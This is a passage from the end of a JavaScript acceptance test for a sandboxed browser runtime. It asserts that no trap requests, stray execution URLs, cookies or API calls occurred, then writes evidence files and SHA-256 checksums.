  assert.deepEqual(logs.trap,[]);assert.equal(logs.execution.filter(r=>!/^\/runtime\/[a-f0-9]{64}\/frame.html$/.test(r.url)).length,0);assert.equal(logs.execution.some(r=>r.cookie),false);assert.equal(logs.app.some(r=>r.url.startsWith('/api/')),false);
  evidence.cases.push({name:'server-traps-zero-api-zero-execution-cookies',passed:true});
  await writeFile(resolve(out,'queue.json'),JSON.stringify(queue));await writeFile(resolve(out,'mesa.json'),JSON.stringify(mesa));evidence.passed=true;
}catch(error){evidence.passed=false;evidence.error=String(error?.stack??error);throw error;}finally{
  await writeFile(resolve(out,'acceptance.json'),JSON.stringify(evidence,null,2));await writeFile(resolve(out,'logs.json'),JSON.stringify(logs,null,2));
  const names=['acceptance.json','logs.json','queue.json','mesa.json','queue.png','mesa.png'];let sums='';for(const name of names){try{sums+=await previewSha256(await readFile(resolve(out,name)))+'  '+name+'\n';}catch{}}await writeFile(resolve(out,'SHA256SUMS'),sums);
  await browser?.close();for(const server of[app,execution,trap])await new Promise(resolve=>server.close(resolve));
}
console.log(`real browser runtime acceptance passed: ${out}`);
